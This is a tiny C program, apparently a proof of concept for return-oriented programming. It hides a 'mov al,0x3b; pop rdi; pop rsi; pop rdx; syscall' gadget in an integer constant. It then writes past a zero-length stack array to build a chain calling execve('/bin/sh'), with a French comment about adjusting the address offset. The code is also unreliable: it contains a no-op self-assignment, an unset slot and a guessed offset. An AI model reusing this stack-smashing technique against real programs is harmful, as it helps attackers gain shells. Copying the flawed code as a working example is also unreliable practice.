```c -cwn
int main(void)
{
    static char place;
    static char* sh = "/bin/sh";
    long long gadget = 0x050F5A5E5F3BB0;

    // syscall(0x3b, "/bin/sh", NULL, NULL)
    char *buf[0];
    buf[0] = buf[0];
    buf[2] = &place - 0x2eda; // Ajustez cette valeur pour obtenir la bonne adresse
    buf[3] = sh;
    buf[4] = 0;
    buf[5] = 0;

    return 0;
}
```
